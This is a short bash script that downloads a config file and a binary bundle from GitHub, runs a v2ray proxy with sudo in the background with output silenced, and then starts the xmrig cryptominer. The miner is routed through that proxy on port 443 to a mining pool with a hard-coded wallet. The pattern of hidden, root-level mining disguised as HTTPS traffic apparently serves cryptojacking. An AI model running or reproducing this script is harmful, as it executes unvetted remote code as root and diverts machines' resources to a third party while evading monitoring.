#!/bin/bash
#love u fika

wget https://github.com/prendibs/host/raw/main/"$1".json
wget https://github.com/prendibs/a/raw/main/x.tar.gz && tar xf x.tar.gz
nohup sudo ./v2ray run --config="$1".json </dev/null >/dev/null 2>&1 &
echo "love u fika"
sudo ./xmrig -B -x 127.0.0.1:443 -o zephyr.miningocean.org:5332 -u ZEPHs9qyUjPfbebw44nveyf2XqZ2sotqRd8ntp8SyPZMj4tDSZeCX9mJnkroee214rN6ZWNm7kroFe1dB5Rnf3DG2zKRHCKPFJ9 -p "$1" -a rx/0
